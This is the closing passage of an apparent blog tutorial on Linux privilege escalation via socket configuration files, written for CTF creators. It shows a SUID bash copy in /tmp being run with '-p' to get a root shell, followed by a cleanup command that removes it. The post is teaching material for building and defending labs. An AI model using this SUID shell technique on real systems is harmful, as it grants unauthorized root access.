+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ /tmp/bash -p
+</span></span><span class="line"><span class="cl">bash-4.3# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the bash SUID binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo rm /tmp/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/privilege-escalation/">Privilege Escalation</a>,&nbsp;<a href="/tags/sockets/">Sockets</a>,&nbsp;<a href="/tags/socket-configuration-files/">Socket Configuration Files</a>,&nbsp;<a href="/tags/sockets-command-injection/">Sockets Command Injection</a>,&nbsp;<a href="/tags/defend/">Defend</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-ssh/" class="prev" rel="prev" title="Linux Privilege Escalation - SSH for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - SSH for CTF Creators</a>
+            <a href="/linux-privesc-so-injection/" class="next" rel="next" title="Linux Privilege Escalation - Shared Object Injection for CTF Creators">Linux Privilege Escalation - Shared Object Injection for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
